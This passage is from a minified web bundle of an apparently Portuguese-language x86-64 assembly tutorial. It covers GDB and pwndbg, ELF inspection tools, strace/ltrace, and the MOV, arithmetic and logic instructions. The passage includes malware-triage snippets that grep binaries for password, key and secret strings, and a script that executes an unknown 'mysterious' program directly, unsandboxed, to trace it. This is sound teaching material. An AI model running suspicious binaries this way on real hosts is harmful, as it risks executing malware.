x/s 0x402000        # string no endereço 0x402000
x/20gx $rsp         # 20 qwords da stack
x/10i _start        # 10 instruções a partir de _start`}),r.jsx("h2",{children:"Disassembly no GDB"}),r.jsx(d,{language:"bash",filename:"gdb_disasm.txt",code:`# Desmontar a função atual:
disassemble (disas)

# Desmontar função específica:
disassemble _start
disassemble main

# Desmontar um range de endereços:
disassemble 0x401000, 0x401050

# Mostrar código e instruções misturados:
disassemble /m _start

# Configurar flavor de sintaxe:
set disassembly-flavor intel    # usar sintaxe Intel!
set disassembly-flavor att      # usar sintaxe AT&T (padrão)

# Dica: adicionar ao ~/.gdbinit:
echo "set disassembly-flavor intel" >> ~/.gdbinit`}),r.jsx("h2",{children:"Layout TUI — Interface Visual"}),r.jsx(d,{language:"bash",code:`# Ativar modo TUI (Text User Interface):
layout asm      # mostra código Assembly
layout regs     # mostra registradores
layout src      # mostra código fonte (se disponível)
layout split    # mostra asm + regs

# Navegar no TUI:
# Ctrl+L  → redesenhar a tela
# Ctrl+X 2 → alternar layouts
# focus cmd → focar no painel de comandos
# focus regs → focar nos registradores`}),r.jsx("h2",{children:"Sessão Prática Completa"}),r.jsx(d,{language:"bash",filename:"sessao.txt",code:`$ gdb ./hello

(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x401000

(gdb) run
Starting program: ./hello
Breakpoint 1, 0x0000000000401000 in _start ()

(gdb) disassemble _start
Dump of assembler code for function _start:
=> 0x0000000000401000 <+0>:   mov    eax,0x1
   0x0000000000401005 <+5>:   mov    edi,0x1
   0x000000000040100a <+10>:  movabs rsi,0x402000
   0x0000000000401014 <+20>:  mov    edx,0xe
   0x0000000000401019 <+25>:  syscall
   0x000000000040101b <+27>:  mov    eax,0x3c
   0x0000000000401020 <+32>:  xor    edi,edi
   0x0000000000401022 <+34>:  syscall

(gdb) stepi    # executa: mov eax, 1
(gdb) info registers rax
rax    0x1    1

(gdb) stepi    # executa: mov edi, 1
(gdb) stepi    # executa: movabs rsi, 0x402000
(gdb) x/s $rsi
0x402000:   "Hello, World!
"

(gdb) stepi    # executa: mov edx, 14
(gdb) stepi    # executa: syscall (write)
Hello, World!  ← aparece no terminal!

(gdb) continue
[Inferior 1 (process 12345) exited normally]`}),r.jsx("h2",{children:"pwndbg — GDB Melhorado"}),r.jsx(T,{type:"info",title:"Instalar pwndbg",children:"pwndbg adiciona visualização automática de registradores, stack e código Assembly toda vez que o programa para. Altamente recomendado para Assembly e segurança."}),r.jsx(d,{language:"bash",code:`# Instalação:
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Com pwndbg, a cada parada você vê automaticamente:
# - Todos os registradores com highlighting
# - Próximas instruções Assembly
# - Topo da stack
# - Código fonte (se disponível)`}),r.jsx("h2",{children:"Comandos pwndbg Extras"}),r.jsx(d,{language:"bash",code:`# Após instalar pwndbg:
context          # mostra contexto completo (regs + asm + stack)
telescope $rsp   # inspeciona stack com informações extras
stack 20         # top 20 valores da stack
regs             # todos os registradores formatados
nearpc 20        # próximas 20 instruções
vmmap            # mapa de memória virtual do processo
checksec         # verifica proteções de segurança do binário`})]})}function Bg(){return r.jsxs(L,{title:"objdump, readelf & nm",subtitle:"Analisando binários sem código fonte",difficulty:"intermediario",timeToRead:"15 min",children:[r.jsxs("p",{children:["Estas ferramentas fazem parte do pacote ",r.jsx("strong",{children:"binutils"})," e são essenciais para analisar binários ELF (Executable and Linkable Format), que é o formato padrão de executáveis no Linux."]}),r.jsx("h2",{children:"objdump — Desmontar e Inspecionar"}),r.jsx(d,{language:"bash",code:`# Desmontar código executável:
objdump -d programa           # desassembla seções de código
objdump -D programa           # desassembla TUDO (incluindo .data)
objdump -M intel -d programa  # usa sintaxe Intel
objdump -S programa           # mistura código C com assembly (precisa de -g)

# Ver seções:
objdump -h programa           # headers das seções
objdump -t programa           # tabela de símbolos (symbol table)

# Formato mais completo:
objdump -M intel -d -j .text programa  # só seção .text em sintaxe Intel`}),r.jsx("h3",{children:"Exemplo de Saída do objdump"}),r.jsx(d,{language:"bash",code:`$ objdump -M intel -d hello

hello:     file format elf64-x86-64

Disassembly of section .text:

0000000000401000 <_start>:
  401000:   b8 01 00 00 00          mov    eax,0x1
  401005:   bf 01 00 00 00          mov    edi,0x1
  40100a:   48 be 00 20 40 00 00    movabs rsi,0x402000
  401011:   00 00 00
  401014:   ba 0e 00 00 00          mov    edx,0xe
  401019:   0f 05                   syscall
  40101b:   b8 3c 00 00 00          mov    eax,0x3c
  401020:   31 ff                   xor    edi,edi
  401022:   0f 05                   syscall`}),r.jsx("h2",{children:"readelf — Informações do Formato ELF"}),r.jsx(d,{language:"bash",code:`# ELF header:
readelf -h programa     # cabeçalho ELF (tipo, arch, entry point...)

# Seções:
readelf -S programa     # todas as seções com tamanhos/endereços
readelf -s programa     # tabela de símbolos
readelf -d programa     # dynamic section (bibliotecas importadas)

# Program headers (segmentos):
readelf -l programa     # como o arquivo é carregado na memória

# Relocations:
readelf -r programa     # tabela de relocações

# Tudo de uma vez:
readelf -a programa`}),r.jsx("h3",{children:"Exemplo de Saída do readelf -S"}),r.jsx(d,{language:"bash",code:`$ readelf -S hello
There are 4 section headers, starting at offset 0x30b8:

Section Headers:
  [Nr] Name    Type      Address          Off    Size   ES Flg
  [ 0]         NULL      0000000000000000 000000 000000 00
  [ 1] .text   PROGBITS  0000000000401000 001000 000024 00  AX
  [ 2] .data   PROGBITS  0000000000402000 002000 00000e 00   WA
  [ 3] .shstrtab STRTAB  0000000000000000 00200e 00001a 00`}),r.jsx("h2",{children:"nm — Tabela de Símbolos"}),r.jsx(d,{language:"bash",code:`# Ver símbolos de um binário ou .o:
nm programa               # todos os símbolos
nm -D programa            # símbolos dinâmicos (bibliotecas compartilhadas)
nm -u programa            # símbolos indefinidos (externos)
nm -n programa            # ordenados por endereço
nm programa.o             # símbolos de um objeto .o

# Tipos de símbolos:
# T — código (.text)    t — código (local)
# D — dado (.data)      d — dado (local)
# B — BSS               b — BSS (local)
# U — undefined         W — weak symbol

$ nm hello
0000000000402000 D mensagem
0000000000401000 T _start`}),r.jsx("h2",{children:"strings — Extrair Strings de Binários"}),r.jsx(d,{language:"bash",code:`# Extrair todas as strings de um binário:
strings programa

# Strings com endereços:
strings -o programa
strings -t x programa    # offset em hex
strings -t d programa    # offset em decimal

# Comprimento mínimo (padrão é 4):
strings -n 6 programa    # strings de no mínimo 6 chars

# Muito útil para análise de malware!
strings malware.exe | grep -i password
strings malware.exe | grep -i http`}),r.jsx("h2",{children:"size — Tamanhos das Seções"}),r.jsx(d,{language:"bash",code:`$ size hello
   text    data     bss     dec     hex filename
     36      14       0      50      32 hello

# text = código executável
# data = dados inicializados
# bss  = dados não inicializados (espaço reservado, não ocupa no arquivo)
# dec  = total em decimal
# hex  = total em hexadecimal`}),r.jsx("h2",{children:"xxd / hexdump — Visualização Hexadecimal"}),r.jsx(d,{language:"bash",code:`# Ver bytes brutos do binário:
xxd programa | head -20
hexdump -C programa | head -20

# Exemplo de saída xxd:
# 00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
# 00000010: 0200 3e00 0100 0000 0010 4000 0000 0000  ..>.......@.....

# 7f 45 4c 46 = magic bytes do ELF (.ELF em ASCII)
# 02 = 64-bit
# 01 = little-endian
# 3e 00 = x86-64 (0x3E = 62)

# Extrair trecho específico:
dd if=programa bs=1 skip=16 count=16 | xxd`}),r.jsx("h2",{children:"strace — Rastrear System Calls"}),r.jsx(T,{type:"info",title:"strace",children:"strace mostra todas as system calls que um programa faz — essencial para entender como programas Assembly interagem com o OS."}),r.jsx(d,{language:"bash",code:`# Rastrear syscalls:
strace ./programa

# Exemplo de saída:
# execve("./hello", ["./hello"], 0x7fff.../envp)  = 0
# write(1, "Hello, World!
", 14)                 = 14
# exit_group(0)                                   = ?

# Mostrar com timestamps:
strace -t ./programa          # hora absoluta
strace -r ./programa          # tempo relativo entre chamadas
strace -T ./programa          # tempo gasto em cada syscall

# Filtrar por syscall específica:
strace -e trace=write,read ./programa
strace -e trace=mmap,brk ./programa   # chamadas de memória

# Contar syscalls:
strace -c ./programa`}),r.jsx("h2",{children:"Workflow Típico de Análise"}),r.jsx(d,{language:"bash",filename:"analise.sh",code:`#!/bin/bash
# Script de análise rápida de binário

PROG=$1

echo "=== ELF Header ==="
readelf -h $PROG | grep -E "Type:|Machine:|Entry point:"

echo -e "
=== Seções ==="
readelf -S $PROG | grep -E ".text|.data|.bss|.rodata"

echo -e "
=== Símbolos ==="
nm $PROG 2>/dev/null | head -20

echo -e "
=== Strings interessantes ==="
strings $PROG | grep -v "^[[:space:]]*$" | head -30

echo -e "
=== Disassembly ==="
objdump -M intel -d $PROG | head -50`})]})}function Pg(){return r.jsxs(L,{title:"strace e ltrace",subtitle:"Rastreando system calls e chamadas de biblioteca em tempo real",difficulty:"intermediario",timeToRead:"12 min",children:[r.jsxs("p",{children:[r.jsx("strong",{children:"strace"})," rastreia todas as system calls de um processo. ",r.jsx("strong",{children:"ltrace"})," rastreia chamadas a bibliotecas compartilhadas. Ambas são ferramentas essenciais para entender o comportamento de programas em tempo de execução."]}),r.jsx("h2",{children:"strace — System Call Tracer"}),r.jsx("h3",{children:"Uso Básico"}),r.jsx(d,{language:"bash",code:`# Rastrear um programa:
strace ./programa

# Rastrear um processo em execução:
strace -p 12345     # 12345 = PID do processo

# Rastrear processo e todos os filhos:
strace -f ./programa

# Saída para arquivo:
strace -o trace.txt ./programa`}),r.jsx("h3",{children:"Opções Úteis"}),r.jsx(d,{language:"bash",code:`# Mostrar tempo:
strace -t  ./prog    # hora de cada chamada
strace -tt ./prog    # com microsegundos
strace -T  ./prog    # tempo gasto em cada chamada

# Filtros:
strace -e trace=write,read,open,close ./prog  # só essas syscalls
strace -e trace=network ./prog                 # todas de rede
strace -e trace=file ./prog                    # todas de arquivo
strace -e trace=process ./prog                 # fork, exec, wait
strace -e trace=memory ./prog                  # mmap, brk, etc.
strace -e trace=signal ./prog                  # sinais

# Resumo estatístico:
strace -c ./prog    # conta tempo e chamadas por syscall`}),r.jsx("h3",{children:"Exemplo Real: Programa Hello World"}),r.jsx(d,{language:"bash",code:`$ strace ./hello
execve("./hello", ["./hello"], 0x7fff5... /* 24 vars */) = 0
write(1, "Hello, World!
", 14)         = 14
exit_group(0)                           = ?
+++ exited with 0 +++`}),r.jsxs("p",{children:["Simples! Apenas 2 syscalls: ",r.jsx("code",{children:"write"})," para imprimir e ",r.jsx("code",{children:"exit_group"})," para sair."]}),r.jsx("h3",{children:"Exemplo Real: ls"}),r.jsx(d,{language:"bash",code:`$ strace -c ls /tmp
...
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 35.12    0.000342          13        26           mmap
 18.44    0.000180          45         4           write
 12.89    0.000126          12        10           openat
  9.77    0.000095          11         8           read
  7.38    0.000072           9         8           close
  ...`}),r.jsx("h2",{children:"Tabela de Syscalls Importantes (Linux x86-64)"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Número"}),r.jsx("th",{children:"Nome"}),r.jsx("th",{children:"Descrição"}),r.jsx("th",{children:"Args"})]})}),r.jsx("tbody",{children:[["0","read","Ler de fd","fd, buf, count"],["1","write","Escrever em fd","fd, buf, count"],["2","open","Abrir arquivo","path, flags, mode"],["3","close","Fechar fd","fd"],["4","stat","Info de arquivo","path, statbuf"],["8","lseek","Posicionar fd","fd, offset, whence"],["9","mmap","Mapear memória","addr, len, prot, flags, fd, off"],["11","munmap","Liberar mmap","addr, len"],["12","brk","Alterar heap","addr"],["22","pipe","Criar pipe","pipefd"],["32","dup","Duplicar fd","fd"],["39","getpid","Obter PID",""],["57","fork","Fork processo",""],["59","execve","Executar programa","path, argv, envp"],["60","exit","Terminar processo","status"],["61","wait4","Esperar filho","pid, wstatus, opts, rusage"],["231","exit_group","Terminar grupo","status"]].map(([i,l,u,m])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:r.jsx("code",{children:l})}),r.jsx("td",{children:u}),r.jsx("td",{children:r.jsx("code",{children:m})})]},i))})]}),r.jsx("h2",{children:"ltrace — Library Call Tracer"}),r.jsx(T,{type:"info",title:"ltrace vs strace",children:"strace = syscalls do kernel. ltrace = chamadas a bibliotecas compartilhadas (printf, malloc, strcmp, etc.). Complementares!"}),r.jsx(d,{language:"bash",code:`# Instalar ltrace:
sudo apt install ltrace

# Rastrear chamadas de biblioteca:
ltrace ./programa_com_libc

# Exemplo de saída:
# printf("Hello, %s!
", "World")        = 13
# malloc(100)                            = 0x55d8a1234260
# free(0x55d8a1234260)                   = <void>
# __libc_start_main(0x401136, 1, ...)    = 0

# Combinar com strace:
strace -e trace=!mmap,mprotect ./prog   # excluir mmap e mprotect`}),r.jsx("h2",{children:"Análise de Programa Desconhecido"}),r.jsx(d,{language:"bash",filename:"investigar.sh",code:`#!/bin/bash
# Investigar comportamento de um programa misterioso

PROG=$1
echo "=== STRINGS ==="
strings $PROG | grep -E "(http|password|key|secret|flag)" 2>/dev/null

echo -e "
=== SYSCALLS (resumo) ==="
strace -c $PROG 2>&1 | head -20

echo -e "
=== ARQUIVOS ACESSADOS ==="
strace -e trace=openat,open $PROG 2>&1 | grep "openat|open"

echo -e "
=== CONEXÕES DE REDE ==="
strace -e trace=connect,socket $PROG 2>&1 | grep -E "connect|socket"

echo -e "
=== PROCESSOS CRIADOS ==="
strace -e trace=fork,clone,execve $PROG 2>&1 | grep -E "fork|clone|execve"`}),r.jsx("h2",{children:"Usando strace para Aprender Syscalls"}),r.jsx(d,{language:"bash",code:`# Ver o que 'ls' faz para listar arquivos:
strace ls /tmp 2>&1 | grep -E "openat|getdents|readdir"

# Ver o que 'cat' faz para ler um arquivo:
strace cat /etc/hostname 2>&1

# Entender alocação de memória:
strace -e trace=mmap,brk,munmap python3 -c "x = [0]*1000000" 2>&1 | head -20`})]})}function Ug(){return r.jsxs(L,{title:"Movimento de Dados",subtitle:"MOV, LEA, XCHG, PUSH, POP e todas as formas de mover dados",difficulty:"iniciante",timeToRead:"15 min",children:[r.jsx("p",{children:"As instruções de movimento de dados são as mais usadas em Assembly. Elas transferem dados entre registradores, memória e valores imediatos."}),r.jsx("h2",{children:"MOV — A Instrução Mais Fundamental"}),r.jsxs("p",{children:["Move (copia) dados de um lugar para outro. ",r.jsx("strong",{children:"Não existe MOV de memória para memória"})," em x86-64!"]}),r.jsx(d,{language:"nasm",filename:"mov.asm",code:`; Formas válidas do MOV:
mov reg, imediato      ; registrador ← valor constante
mov reg, reg           ; registrador ← registrador
mov reg, [mem]         ; registrador ← memória (leitura)
mov [mem], reg         ; memória ← registrador (escrita)
mov [mem], imediato    ; memória ← valor constante

; Exemplos:
mov rax, 42            ; rax = 42
mov rbx, rax           ; rbx = rax (copia)
mov rcx, [0x401000]    ; rcx = qword na memória
mov [rbx], rax         ; memória em rbx recebe rax
mov byte [rbx], 10     ; escreve byte 10

; INVÁLIDO — não existe:
; mov [mem1], [mem2]   ; erro! use um registrador intermediário`}),r.jsx(T,{type:"warning",title:"MOV não seta flags!",children:"Ao contrário de ADD e SUB, o MOV não altera nenhuma flag no registrador RFLAGS. Não use CMP logo após MOV esperando flags válidas da operação MOV."}),r.jsx("h2",{children:"MOVZX — Move com Zero-Extension"}),r.jsx("p",{children:"Copia um valor menor para um registrador maior, preenchendo com zeros:"}),r.jsx(d,{language:"nasm",filename:"movzx.asm",code:`; movzx destino (maior), fonte (menor)
movzx rax, bl          ; rax = zero_extend(bl)  — byte para 64-bit
movzx rax, bx          ; rax = zero_extend(bx)  — word para 64-bit
movzx rax, ebx         ; INVÁLIDO — use mov eax, ebx (zera superior automaticamente!)
movzx eax, bl          ; eax = zero_extend(bl)  — byte para 32-bit
movzx eax, bx          ; eax = zero_extend(bx)  — word para 32-bit

; Exemplo:
mov bl, 0xFF           ; bl = 255 (unsigned) ou -1 (signed)
movzx rax, bl          ; rax = 0x00000000000000FF = 255`}),r.jsx("h2",{children:"MOVSX — Move com Sign-Extension"}),r.jsx("p",{children:"Copia um valor menor para um registrador maior, propagando o bit de sinal:"}),r.jsx(d,{language:"nasm",filename:"movsx.asm",code:`; movsx destino (maior), fonte (menor)
movsx rax, bl          ; rax = sign_extend(bl)
movsx rax, bx          ; rax = sign_extend(bx)
movsx rax, ebx         ; rax = sign_extend(ebx) — MOVSXD
movsxd rax, ebx        ; forma explícita para 32→64

; Exemplo:
mov bl, 0xFF           ; bl = -1 (interpretado como signed)
movsx rax, bl          ; rax = 0xFFFFFFFFFFFFFFFF = -1

mov bl, 0x7F           ; bl = 127 (bit de sinal = 0)
movsx rax, bl          ; rax = 0x000000000000007F = 127`}),r.jsx("h2",{children:"LEA — Load Effective Address"}),r.jsxs("p",{children:["Calcula o endereço dentro dos colchetes ",r.jsx("strong",{children:"sem acessar a memória"}),". Extremamente útil para aritmética:"]}),r.jsx(d,{language:"nasm",filename:"lea.asm",code:`; LEA — o endereço É o resultado, não o conteúdo
lea rax, [rbx]             ; rax = rbx (cópia trivial)
lea rax, [rbx + 8]         ; rax = rbx + 8
lea rax, [rbx + rcx]       ; rax = rbx + rcx
lea rax, [rbx + rcx*4]     ; rax = rbx + rcx*4
lea rax, [rbx + rcx*8 + 16]; rax = rbx + rcx*8 + 16

; Truques com LEA:
lea rax, [rax + rax]       ; rax = rax * 2 (shift left 1)
lea rax, [rax + rax*4]     ; rax = rax * 5 (base + index*4)
lea rax, [rax*4 + rax]     ; rax = rax * 5 (alternativo)

; LEA para endereço de variável:
lea rsi, [mensagem]         ; rsi = endereço de 'mensagem'
lea rsi, [rel mensagem]     ; rsi = endereço relativo ao RIP (posição independente)`}),r.jsx("h2",{children:"XCHG — Troca de Valores"}),r.jsx(d,{language:"nasm",filename:"xchg.asm",code:`xchg rax, rbx    ; troca rax e rbx (sem registrador temporário!)
xchg rax, [mem]  ; troca rax com memória (operação atômica!)

; Nota: xchg com memória é sempre atômica (tem LOCK implícito)
; xchg eax, eax é um NOP em processadores Intel (mesma coisa que nop)`}),r.jsx("h2",{children:"PUSH e POP — Stack"}),r.jsx(d,{language:"nasm",filename:"push_pop.asm",code:`; PUSH: decrementa RSP e escreve na memória
push rax         ; RSP -= 8; [RSP] = rax
push rbx         ; RSP -= 8; [RSP] = rbx
push rcx         ; RSP -= 8; [RSP] = rcx
push 42          ; RSP -= 8; [RSP] = 42 (imediato)

; POP: lê da memória e incrementa RSP
pop rcx          ; rcx = [RSP]; RSP += 8
pop rbx          ; rbx = [RSP]; RSP += 8
pop rax          ; rax = [RSP]; RSP += 8

; Salvar e restaurar registradores:
push rax         ; salvar
push rbx
; ... usa rax e rbx para outra coisa ...
pop rbx          ; restaurar (ordem INVERSA!)
pop rax`}),r.jsx("h2",{children:"PUSHA / POPA (32-bit apenas)"}),r.jsx(d,{language:"nasm",code:`; Em 32-bit (NÃO disponível em 64-bit!):
pusha    ; push todos os registradores gerais (EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI)
popa     ; pop todos em ordem inversa`}),r.jsx("h2",{children:"PUSHF / POPF — Salvar Flags"}),r.jsx(d,{language:"nasm",filename:"pushf.asm",code:`pushfq    ; push RFLAGS (64-bit) na stack
popfq     ; pop da stack para RFLAGS

; Útil para salvar estado de flags antes de operações que as modificam:
pushfq
; ... operações ...
popfq     ; restaura flags originais`}),r.jsx("h2",{children:"MOVS / CMOVCC — Cópia Condicional"}),r.jsx(d,{language:"nasm",filename:"cmov.asm",code:`; CMOV — Move Condicional (não há salto, elimina branch misprediction)
cmp rax, rbx
cmove  rax, rcx   ; rax = rcx SE rax == rbx (ZF=1)
cmovne rax, rcx   ; rax = rcx SE rax != rbx
cmovl  rax, rcx   ; rax = rcx SE rax < rbx (signed)
cmovle rax, rcx   ; rax = rcx SE rax <= rbx (signed)
cmovg  rax, rcx   ; rax = rcx SE rax > rbx (signed)
cmovge rax, rcx   ; rax = rcx SE rax >= rbx (signed)
cmovb  rax, rcx   ; rax = rcx SE rax < rbx (unsigned)
cmovae rax, rcx   ; rax = rcx SE rax >= rbx (unsigned)

; Exemplo: max(rax, rbx) sem branch:
cmp rax, rbx
cmovl rax, rbx    ; se rax < rbx, rax = rbx (seleciona o maior)`}),r.jsx(T,{type:"success",title:"CMOV para performance",children:"CMOV pode ser muito mais rápido que JCC (salto condicional) em código moderno, porque elimina branch misprediction. Use quando a operação é simples e o custo de uma misprediction seria alto."}),r.jsx("h2",{children:"MOV Especiais"}),r.jsx(d,{language:"nasm",filename:"mov_especiais.asm",code:`; MOVABS — mov de 64-bit imediato (único modo para imediatos 64-bit grandes)
mov rax, 0x123456789ABCDEF0    ; MOVABS (gerado automaticamente quando necessário)

; Nota: MOV reg32, imm32 gera código menor que MOV reg64, imm64
; O compilador prefere: mov eax, 0x42 (zera bits superiores de rax automaticamente!)

; MOVNTI — Non-Temporal Move (bypass cache)
movnti [destino], rax         ; escreve direto na RAM, sem passar pelo cache
; Útil para streaming de grandes blocos de dados`})]})}function Ig(){return r.jsxs(L,{title:"Operações Aritméticas",subtitle:"ADD, SUB, MUL, DIV, IMUL, IDIV, INC, DEC e variações",difficulty:"iniciante",timeToRead:"20 min",children:[r.jsx("p",{children:"As instruções aritméticas são o coração de qualquer cálculo em Assembly. x86-64 tem instruções tanto para aritmética sem sinal quanto com sinal."}),r.jsx("h2",{children:"ADD — Adição"}),r.jsx(d,{language:"nasm",filename:"add.asm",code:`; ADD destino, fonte  (destino = destino + fonte)
add rax, rbx         ; rax = rax + rbx
add rax, 10          ; rax = rax + 10
add rax, [mem]       ; rax = rax + conteúdo da memória
add [mem], rax       ; memória = memória + rax
add [mem], 5         ; memória = memória + 5

; Flags afetadas: CF, OF, SF, ZF, AF, PF

; Detectar overflow unsigned (carry):
add rax, rbx
jc  overflow_unsigned   ; CF=1 se houve carry

; Detectar overflow signed:
add rax, rbx
jo  overflow_signed     ; OF=1 se houve overflow`}),r.jsx("h2",{children:"ADC — Adição com Carry"}),r.jsx(d,{language:"nasm",filename:"adc.asm",code:`; ADC (Add with Carry) — usado para números maiores que 64-bit
; Simular adição de 128-bit:
; [rdx:rax] + [rbx:rcx]
add rax, rcx          ; soma os 64-bits baixos (pode gerar carry)
adc rdx, rbx          ; soma os 64-bits altos + carry do anterior`}),r.jsx("h2",{children:"SUB — Subtração"}),r.jsx(d,{language:"nasm",filename:"sub.asm",code:`; SUB destino, fonte  (destino = destino - fonte)
sub rax, rbx         ; rax = rax - rbx
sub rax, 5           ; rax = rax - 5
sub [mem], rax       ; memória = memória - rax

; Flags afetadas: CF, OF, SF, ZF, AF, PF
; CF = 1 se houve borrow (resultado negativo em unsigned)

; NEG — Negação (complemento de dois)
neg rax              ; rax = -rax (0 - rax)
neg [mem]            ; nega valor na memória`}),r.jsx("h2",{children:"INC e DEC — Incremento e Decremento"}),r.jsx(d,{language:"nasm",filename:"inc_dec.asm",code:`inc rax       ; rax = rax + 1 (NÃO afeta CF!)
dec rax       ; rax = rax - 1 (NÃO afeta CF!)
inc byte [mem]  ; incrementa byte na memória
dec word [mem]  ; decrementa word na memória

; ATENÇÃO: INC/DEC não afetam o Carry Flag (CF)!
; Por isso, para loops, às vezes ADD/SUB são preferidos
; para compatibilidade com verificações de overflow`}),r.jsx("h2",{children:"MUL — Multiplicação sem Sinal"}),r.jsx(T,{type:"info",title:"MUL é diferente!",children:"MUL só tem UM operando explícito. O outro operando está implicitamente em RAX. O resultado vai para RDX:RAX (128 bits)!"}),r.jsx(d,{language:"nasm",filename:"mul.asm",code:`; MUL fonte  (RDX:RAX = RAX × fonte)
; O multiplicador implícito é sempre AL/AX/EAX/RAX

; 8-bit: AX = AL × fonte8
mul bl         ; AX = AL × BL

; 16-bit: DX:AX = AX × fonte16
mul bx         ; DX:AX = AX × BX

; 32-bit: EDX:EAX = EAX × fonte32
mul ebx        ; EDX:EAX = EAX × EBX

; 64-bit: RDX:RAX = RAX × fonte64
mul rbx        ; RDX:RAX = RAX × RBX

; Exemplo prático — multiplicar rax × 5:
mov rax, 10
mov rbx, 5
mul rbx        ; RDX:RAX = 10 × 5 = 50
               ; RAX = 50, RDX = 0`}),r.jsx("h2",{children:"IMUL — Multiplicação com Sinal"}),r.jsx("p",{children:"IMUL tem três formas — mais flexível que MUL:"}),r.jsx(d,{language:"nasm",filename:"imul.asm",code:`; Forma 1: como MUL (1 operando explícito)
; RDX:RAX = RAX × fonte (com sinal)
imul rbx

; Forma 2: 2 operandos
; dest = dest × fonte (overflow é perdido silenciosamente)
imul rax, rbx         ; rax = rax × rbx
imul rax, [mem]       ; rax = rax × memória

; Forma 3: 3 operandos (mais útil!)
; dest = fonte1 × imediato
imul rax, rbx, 5      ; rax = rbx × 5
imul rax, rbx, 100    ; rax = rbx × 100
imul rax, [mem], 7    ; rax = memória × 7

; A forma 3 é a mais usada pois permite multiplicação por constante
; sem usar um registrador extra e sem acumulador implícito`}),r.jsx("h2",{children:"DIV — Divisão sem Sinal"}),r.jsx(T,{type:"danger",title:"Cuidado com divisão por zero!",children:"Divisão por zero causa uma exceção #DE (Divide Error) que termina o programa. Sempre verifique o divisor antes de dividir!"}),r.jsx(d,{language:"nasm",filename:"div.asm",code:`; DIV fonte — divisão sem sinal
; Quociente → RAX (ou AL/AX/EAX dependendo do tamanho)
; Resto     → RDX (ou AH/DX/EDX)

; Antes de DIV, RDX deve ser zerado (ou conter parte alta do numerador)!

; Exemplo: 100 ÷ 7
xor rdx, rdx          ; zerar RDX (parte alta do numerador)
mov rax, 100          ; numerador em RAX
mov rbx, 7            ; divisor
div rbx               ; RAX = 100 ÷ 7 = 14, RDX = 100 % 7 = 2

; Tamanhos:
; 8-bit:  AX ÷ fonte8  → AL = quociente, AH = resto
; 16-bit: DX:AX ÷ fonte16 → AX = quociente, DX = resto
; 32-bit: EDX:EAX ÷ fonte32 → EAX = quociente, EDX = resto
; 64-bit: RDX:RAX ÷ fonte64 → RAX = quociente, RDX = resto

; Cuidado com divisão que gera quociente maior que o registrador destino!
; Ex: 1000 ÷ 1 com numerador em AX e RDX não zerado → overflow exception`}),r.jsx("h2",{children:"IDIV — Divisão com Sinal"}),r.jsx(d,{language:"nasm",filename:"idiv.asm",code:`; IDIV — como DIV mas com sinal
; Antes do IDIV, deve-se fazer extensão de sinal de RAX para RDX:RAX

; Extensão de sinal com CDQ/CQO:
mov rax, -17
cqo              ; sign-extend RAX → RDX:RAX (copia bit de sinal para RDX)
mov rbx, 5
idiv rbx         ; RAX = -17 ÷ 5 = -3, RDX = -17 % 5 = -2

; Instruções de extensão de sinal:
; CBW   — sign-extend AL → AX
; CWD   — sign-extend AX → DX:AX
; CDQ   — sign-extend EAX → EDX:EAX
; CQO   — sign-extend RAX → RDX:RAX`}),r.jsx("h2",{children:"Otimizações com Shifts"}),r.jsx(d,{language:"nasm",filename:"opt_arith.asm",code:`; Multiplicação por potência de 2 → SHL (muito mais rápido!)
shl rax, 1        ; rax = rax × 2
shl rax, 2        ; rax = rax × 4
shl rax, 3        ; rax = rax × 8
shl rax, 10       ; rax = rax × 1024

; Divisão por potência de 2 → SHR (sem sinal)
shr rax, 1        ; rax = rax ÷ 2
shr rax, 3        ; rax = rax ÷ 8

; Divisão com sinal → SAR (mantém bit de sinal)
sar rax, 2        ; rax = rax ÷ 4 (signed)

; LEA para multiplicação por números como 3, 5, 9:
lea rax, [rax + rax*2]   ; rax = rax + rax×2 = rax × 3
lea rax, [rax + rax*4]   ; rax = rax + rax×4 = rax × 5
lea rax, [rax + rax*8]   ; rax = rax + rax×8 = rax × 9`}),r.jsx("h2",{children:"Exemplos Práticos"}),r.jsx(d,{language:"nasm",filename:"exemplos_arit.asm",code:`; Calcular: resultado = (a + b) * c - d
; Assumindo: a=rdi, b=rsi, c=rdx, d=rcx

mov rax, rdi          ; rax = a
add rax, rsi          ; rax = a + b
imul rax, rdx         ; rax = (a + b) * c
sub rax, rcx          ; rax = (a + b) * c - d
; resultado em rax

; Verificar se número é par ou ímpar:
mov rax, numero
test rax, 1           ; AND com 1 (testa bit 0)
jz  .par              ; ZF=1 → bit 0 era 0 → par
; .impar:
jmp .impar
.par:
    ; é par

; Calcular valor absoluto:
mov rax, numero
cmp rax, 0
jge .positivo
neg rax               ; nega se negativo
.positivo:`})]})}function kg(){return r.jsxs(L,{title:"Operações Lógicas",subtitle:"AND, OR, XOR, NOT, TEST e manipulação de bits",difficulty:"iniciante",timeToRead:"15 min",children:[r.jsx("p",{children:"Operações lógicas manipulam dados bit a bit. São essenciais para mascaramento de bits, verificação de flags de hardware, criptografia e otimização de código."}),r.jsx("h2",{children:"AND — E Lógico"}),r.jsx("p",{children:"Resultado é 1 apenas quando AMBOS os bits são 1."}),r.jsx(d,{language:"nasm",filename:"and.asm",code:`and rax, rbx         ; rax = rax AND rbx
and rax, 0xFF        ; rax = rax AND 0xFF (mascara byte baixo)
and byte [mem], 0x0F ; aplica máscara na memória

; Tabela verdade:
;   0 AND 0 = 0
;   0 AND 1 = 0
;   1 AND 0 = 0
;   1 AND 1 = 1

; Uso principal: MASCARAR bits (isolar bits específicos)

; Exemplo: pegar apenas os 4 bits baixos:
;   1011 1101
; & 0000 1111  ← máscara 0x0F
;   ---------
;   0000 1101  ← apenas nibble baixo

; Verificar se bit N está setado:
test rax, (1 << 3)   ; verifica bit 3
jnz bit_setado       ; ZF=0 → bit estava setado`}),r.jsx("h2",{children:"OR — OU Lógico"}),r.jsx("p",{children:"Resultado é 1 quando PELO MENOS UM bit é 1."}),r.jsx(d,{language:"nasm",filename:"or.asm",code:`or rax, rbx          ; rax = rax OR rbx
or rax, 0x80         ; seta bit 7 de rax
